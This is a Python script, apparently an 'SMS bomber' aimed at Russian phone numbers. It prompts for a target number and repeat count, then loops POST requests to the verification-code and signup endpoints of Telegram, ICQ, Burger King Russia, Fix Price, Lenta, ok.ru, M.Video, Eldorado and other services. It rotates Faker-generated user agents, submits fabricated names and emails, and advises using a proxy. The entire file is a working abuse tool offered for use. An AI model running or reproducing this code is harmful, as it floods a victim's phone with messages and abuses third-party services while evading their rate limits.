import time

import requests
from faker import Faker


def format_dash(phone_number: str) -> str:
    """+7(953)-531-58-53"""
    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
    phone_number = ("+" + phone_number[:1] + "(" + phone_number[1:4] + ")" + "-" + phone_number[4:7] + "-" +
                    phone_number[7:9] + "-" + phone_number[9:11])
    return str(phone_number)


def format_spaces(phone_number: str) -> str:
    """+7 (953) 531 58 53"""
    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
    phone_number = ("+" + phone_number[:1] + " (" + phone_number[1:4] + ")" + " " + phone_number[4:7] + " " +
                    phone_number[7:9] + " " + phone_number[9:11])
    return str(phone_number)


def format_spaces_without_braces(phone_number: str) -> str:
    """+7 953 531 5853"""
    phone_number = phone_number.replace("+", "").replace(" ", "").replace("-", "")
    phone_number = ("+" + phone_number[:1] + " " + phone_number[1:4] + " " + phone_number[4:7] + " " +
                    phone_number[7:11])
    return str(phone_number)


def format_plus(phone_number: str) -> str:
    """79535315853"""
    return phone_number[1:12]


def format_plus_8(phone_number: str) -> str:
    """89535315853"""
    return "8" + phone_number[1:12]


faker = Faker(locale="ru")

# CONFIGPATH = Path(f"{os.curdir}/config.json")
#
# if CONFIGPATH.exists():
#
#     with open(CONFIGPATH, "r", encoding="UTF-8") as config:
#         cfg = json.load(config)
#
# else:
#     open(CONFIGPATH, "x").close()
#
#     with open(CONFIGPATH, "w", encoding="UTF-8") as config:
#         cfg = {"user-agent": ""}
#         json.dump(cfg, config)
#
# if cfg["user-agent"] == "":
#     print("Would you like to use a custom user agent? You can change it whenever you want in config.json file.\n"
#           "Put \"__random__\" in there, if you want to use random user agent.")
#     a = input("User agent (leave empty for random): ")
#     cfg["user-agent"] = "__random__" if a == "" else a
#     with open("config.json", "w", encoding="UTF-8") as config:
#         json.dump(cfg, config, indent=4)
#     del a
#
# with open("config.json", "r", encoding="UTF-8") as config:
#     cfg = json.load(config)
while True:

    print("""
     ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓███████▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░▒▓█▓▒░        
    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓█▓▒░        
    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░         ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
     ░▒▓██████▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░  
                                         
    it's better to use proxy""")

    while True:
        NUMBER = input("Phone number (+79000000000 format): ")
        if NUMBER[0] != "+":
            print("Wrong format")
        else:
            break
    print(f"{NUMBER} selected as target number.")

    while True:
        try:
            RANGE = int(input("Range: "))
            INTERVAL = int(input("Interval (no interval = 0): "))
            break
        except ValueError:
            print("Wrong value")

    for i in range(RANGE):
        print(f"Starting cycle {i}")
        # if cfg["user-agent"].lower() == "__random__" or cfg["user-agent"] == "":
        HEADERS = {'user_agent': faker.user_agent()}
        print(f"{HEADERS['user_agent']} was selected as user agent for this cycle")
        # else:
        #     HEADERS = {'user_agent': cfg["user-agent"]}
        try:
            requests.post('https://my.telegram.org/auth/send_password',
                          headers=HEADERS, data={'phone': NUMBER}, timeout=5.05)
            print("[+] my.telegram.org")

            requests.post('https://gorodtroika.ru/api/registration/phone',
                          headers=HEADERS, data={'phone': format_plus(NUMBER)}, timeout=5.05)
            print("[+] gorodtroika.ru")

            requests.post('https://burgerkingrus.ru/user/v3/auth/signup',
                          headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}", "invite": ""},
                          timeout=5.05)
            print("[+] burgerkingrus.ru")

            requests.post('https://icq.com/smscode/login/ru',
                          headers=HEADERS, data={"msisdn": f"{format_plus(NUMBER)}"}, timeout=5.05)
            print("[+] icq.com")

            requests.post('https://u.icq.net/api/v92/rapi/auth/sendCode',
                          headers=HEADERS, json={"reqId": "81625-1703181748",
                                                 "params": {"phone": f"{format_plus(NUMBER)}",
                                                            "language": "en-US",
                                                            "route": "sms", "devId": "ic1rtwz1s1Hj1O0r",
                                                            "application": "icq"}}, timeout=5.05)
            print("[+] u.icq.net")

            requests.post('https://autopragmat.ru/api/v1/send-order/',
                          headers=HEADERS,
                          data={"name": f"{faker.name()}",
                                "tel": f"{format_plus_8(NUMBER)}",
                                "email": f"{faker.email(safe=False)}", "program": "All"})
            print("[+] ratata.ru")

            requests.post('https://api.fix-price.com/buyer/v2/registration/phone/request',
                          headers=HEADERS, json={"phone": f"{format_dash(NUMBER)}"}, timeout=5.05)
            print("[+] api.fix-price.com")

            requests.post('https://lenta.com/api/v1/registration/requestValidationCode',
                          headers=HEADERS, json={"phone": f"{format_plus(NUMBER)}"}, timeout=5.05)
            print("[+] lenta.com")

            requests.post(
                'https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone',
                headers=HEADERS, data={"st.r.phone": NUMBER}, timeout=5.05)
            print("[+] ok.ru")

            requests.post('https://api.sunlight.net/modules/customer-auth/v1/web/send/',
                          headers=HEADERS, json={"phone": f"{NUMBER}", "source": "web_auth_page"},
                          timeout=5.05)
            print("[+] api.sunlight.net")

            requests.post('https://tochka.com/api/v1/crm/request',
                          headers=HEADERS,
                          json={"url_path": "/", "phone": f"{format_spaces(NUMBER)}", "inn": "",
                                "clientname": "", "comment": "", "city": "", "crm_type": "signup",
                                "product": False, "yandex_uid": None, "advid": "",
                                "page_description": "Главная страница сайта", "agree_to_receive_ad": True})
            print("[+] tochka.com")

            requests.post('https://www.mvideo.ru/bff/auth/login-step-1',
                          headers=HEADERS,
                          json={"phoneNumber": NUMBER,
                                "token": "nocaptchatoken",
                                "sendBy": "CASCADE",
                                "action": "SENT_PIN_CODE"})
            print("[+] mvideo.ru")

            requests.post('https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php',
                          headers=HEADERS,
                          json={"user_login": format_spaces_without_braces(NUMBER),
                                "reregistration": "0",
                                "organization": "0"})
            print("[+] eldorado.ru")
        except Exception as e:
            print(f"{e=}")

        print(f"{i} cycle finished")
        time.sleep(INTERVAL)
